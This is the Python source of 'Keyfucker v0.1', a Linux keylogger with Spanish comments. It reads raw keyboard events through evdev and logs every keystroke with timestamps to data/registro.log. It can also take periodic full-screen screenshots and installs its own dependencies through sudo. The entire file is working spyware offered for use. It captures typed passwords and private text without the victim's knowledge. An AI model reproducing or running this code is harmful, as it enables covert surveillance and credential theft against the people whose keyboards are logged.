#!/usr/bin/python
# -*- coding: utf-8 -*-
'''
Keyfucker v0.1
Author: Oscar Maestre
mail: oscarlibre@gmail.com
'''
from keylist import teclas
from threading import Thread
import commands, os
import time, sys

try:
	from evdev import InputDevice
	from select import select

except:
	print " Se instalaran las dependecias "
	os.system("sudo apt-get update && sudo apt-get install -y python-pip imagemagick && sudo pip install evdev")
	from evdev import InputDevice
	from select import select 	

evento=commands.getoutput("grep -E 'Handlers|EV=' /proc/bus/input/devices | grep -B1 'EV=120013' | grep -Eo 'event[0-9]+'")
if evento.find('\n') > 0:
	evento = evento.split('\n')[1]
teclado = InputDevice('/dev/input/' + evento)
imagen = False
ruta=False
CAPSLOCK = False
buffer_txt = ""

#screenshots
if '-h' in sys.argv:
	print "uso del comando ./keyfucker.py [-s] [tiempo]"
	print "-s [segs] activa patallazos cada n segundos"
	sys.exit()

elif '-s' in sys.argv:
	
	indice = sys.argv.index('-s')
	periodo = sys.argv[indice + 1]
	#print "argumentos",  sys.argv[indice], periodo
	if int(periodo) > 9:
		imagen = True
'''
#ruta
if '-r' in sys.argv:
	indice = sys.argv.index('-s')
	ruta = sys.argv[indice+1]	
'''
if 'registro.log' not in commands.getoutput("ls data").split("\n"):
	f = open('data/registro.log','w')
	f.close()
	
f = open('data/registro.log','a')

def pantallazo(secs):
	try:
		while True:
			#print "pantallazo"
			time.sleep(secs)
			tag = time.strftime("%d-%m-%Y") + "__" + time.strftime("%H:%M:%S")
			os.system("import -window root data/" + tag + ".png")
	except:
			sys.exit()	

if imagen:
	hilo = Thread(target = pantallazo, args = (int(periodo),))
	hilo.start()

try:
	print "--------------------------"
	print "- KEYFUCKER ejecutandose -"
	print "- ruta data/registro.log -"
	print "--------------------------"
	while True:	
				r= select([teclado], [], [])
				LISTA=list(teclado.read())
				if len(LISTA)==3:
					linea=str(LISTA[1])
					
				elif len(LISTA)==4:
					linea=str(LISTA[2])
					
				i0=linea.find('code')
				i1=linea[i0:].find(',')
				cod=int(linea[i0+5:i0+i1])
				val=int(linea[-1:])

				if val == 1:			
					if cod not in teclas:
						letra="--DESCONOCIDA--"
					else:
						letra=teclas[cod]										
					if letra=="CAPSLOCK":
						letra="--CAPSLOCK--"
						CAPSLOCK = not CAPSLOCK			
					elif letra=="ENTER":
						letra="\n"
					if not CAPSLOCK:
						if letra!="--CAPSLOCK--":
							letra=letra.lower()
					#print cod,val,letra, buffer_txt		
					buffer_txt+=letra

				if len(buffer_txt) > 30 and (buffer_txt[-2:] == "--" or buffer_txt[-1] == " ") :
					tiempo="[" + time.strftime("%d-%m-%Y") + " " + time.strftime("%H:%M:%S")+"] "
					f.write(tiempo + buffer_txt + "\n")
					f.close()
					f=open('data/registro.log','a')
					buffer_txt = ''
except:				
	f.close()
	sys.exit()
